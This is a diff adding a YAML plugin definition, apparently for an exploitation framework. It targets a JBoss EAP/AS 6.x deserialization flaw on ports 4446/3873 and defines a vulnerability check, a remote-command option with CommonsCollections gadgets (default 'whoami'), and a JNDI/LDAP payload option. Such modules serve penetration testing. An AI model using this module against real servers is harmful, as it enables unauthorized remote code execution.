@@ -1,0 +1,36 @@
+info:
+    app: Jboss
+    name: 202204_RPC
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2022-04-27"
+    create_date: "2024-10-06 07:44:45"
+    update_date: "2024-10-06 07:44:45"
+    scope: JBoss eap/as <= 6.*
+    description: 4446/3873端口可直接发送反序列化数据。
+payloads:
+    - name: check1
+      alias: 检测漏洞
+    - name: cmd1
+      alias: RCE
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+          - key: gadget
+            title: Gadget
+            param_type: combobox
+            default_value:
+                - CommonsCollectionsK1ErrorEcho
+                - CommonsCollectionsK2ErrorEcho
+            required: true
+    - name: cmd2
+      alias: JNDI
+      params:
+          - key: cmd
+            title: ldap地址
+            param_type: edit
+            default_value: ldap://127.0.0.1:1099/yso_p.CommonsCollectionsK1__c.calc
+            required: true
